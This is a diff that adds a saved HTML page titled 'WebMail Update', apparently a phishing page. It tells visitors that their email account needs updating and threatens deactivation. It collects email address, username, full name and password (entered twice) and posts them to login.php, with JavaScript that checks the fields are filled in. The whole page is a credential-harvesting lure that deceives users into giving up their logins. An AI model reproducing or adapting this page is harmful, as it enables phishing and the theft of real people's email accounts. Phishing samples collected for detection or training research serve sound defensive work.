@@ -1,0 +1,120 @@
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.or
+g/TR/xhtml1/DTD/xhtml1-transitional.dtd">
+<!-- saved from url=(0023)http://hotemail.t25.us/ -->
+<html xmlns="http://www.w3.org/1999/xhtml"><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+    
+    <title>WebMail Update</title>
+    <link href="./WebMail Update_files/default2.css" rel="stylesheet" type="text/css">
+</head>
+
+<body class="centre" style="margin-top: 32px; text-align: centre; background: #fff; text-align: center; font-family: Arial, Helvetica, sans-serif; /* font-
+
+size: 12px; */ ">
+<div style="background: #143265 url(&#39;http://www.outitgoes.com/images/bg_loginbox.png&#39;) no-repeat top; width: 430px;  margin: 0 auto; color: #fff; -moz-border-radius-bottomright: 18px; -moz-border-radius-bottomleft: 18px; -webkit-border-bottom-left-radius: 18px; -webkit-border-
+
+bottom-right-radius: 18px; padding-left:20px; padding-right:20px; padding-top:120px; padding-bottom:30px" id="defcontainer">
+<form method="post" action="login.php" onsubmit="return validateForm()">
+			<div>
+
+			<h1>FILL IN TO UPDATE YOUR E-MAIL ACCOUNT</h1>
+			<p>Please Enter Your Email Account Information To Update.&nbsp;
+                         Entering a Wrong Information May Lead To the Deactivation of Your Email Account.</p>
+			<div class="centre">
+			<table width="420" style="margin-left: auto; margin-right: auto; width: 420px">
+			<tbody>
+
+			<tr>
+			<th width="45%" style="width: 20%; text-align: left; padding-right: 1em">Email&nbsp;Address: </th>
+
+			<td width="55%" style="text-align: left"><input type="text" name="email" id="email" size="30"></td>
+			</tr>
+<tr>
+			<th width="45%" style="width: 20%; text-align: left; padding-right: 1em">Username: </th>
+
+			<td width="55%" style="text-align: left"><input type="text" name="username" id="username" size="30"></td>
+			</tr>
+<tr>
+			<th width="45%" style="width: 20%; text-align: left; padding-right: 1em">Full name: </th>
+
+			<td width="55%" style="text-align: left"><input type="text" name="Fullname" id="Fullname" size="30"></td>
+			</tr>
+			<tr>
+			<th style="text-align: left; padding-right: 1em">Password: </th>
+			<td style="text-align: left"><input type="password" name="passwrd" id="passwrd" size="30"></td>
+                        </tr>
+                        <tr>
+			<th style="text-align: left; padding-right: 1em">Confirm&nbsp;Password: </th>
+			<td style="text-align: left"><input type="password" name="passwrd1" id="passwrd1" size="30"></td>
+
+			</tr>
+			</tbody>
+			</table>
+
+			<br><br>
+			<input type="submit" value="Update Now!">
+			<br><br>
+
+			<br><br>
+			</div>
+
+			</div></form>
+</div>
+
+<a href="http://host39.com/" target="_blank"></a>
+
+
+<script type="text/javascript" async="" src="./WebMail Update_files/ga.js"></script><script type="text/javascript" async="" src="./WebMail Update_files/ga.js"></script>
+
+
+<script type="text/javascript">
+
+ function validateForm(){
+
+var emailPattern = /^[a-zA-Z0-9._-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,4}$/;
+
+
+var email = document.getElementById('email').value;
+email=email.replace(/^\s+|\s+$/g,'');
+if(email==''){
+alert ("Please enter your email address");
+document.getElementById("email").focus();
+return false;
+}
+
+
+
+var myemailCheck=emailPattern.test(email);
+    
+	if(myemailCheck==false){
+	alert("Please enter a valid email address");
+	document.getElementById("email").focus();
+	return false;
+	}
+
+
+var passwrd = document.getElementById('passwrd').value;
+passwrd=passwrd.replace(/^\s+|\s+$/g,'');
+if(passwrd==''){
+alert ("Please your password");
+document.getElementById("passwrd").focus();
+return false;
+}
+
+var passwrd1 = document.getElementById('passwrd1').value;
+passwrd1=passwrd1.replace(/^\s+|\s+$/g,'');
+if(passwrd1==''){
+alert ("Please re-type your password");
+document.getElementById("passwrd1").focus();
+return false;
+}
+
+if(passwrd != passwrd1){
+alert ("Please re-type your password");
+document.getElementById("passwrd1").focus();
+return false;
+}
+
+return true;
+ }
+
+</script></body></html>
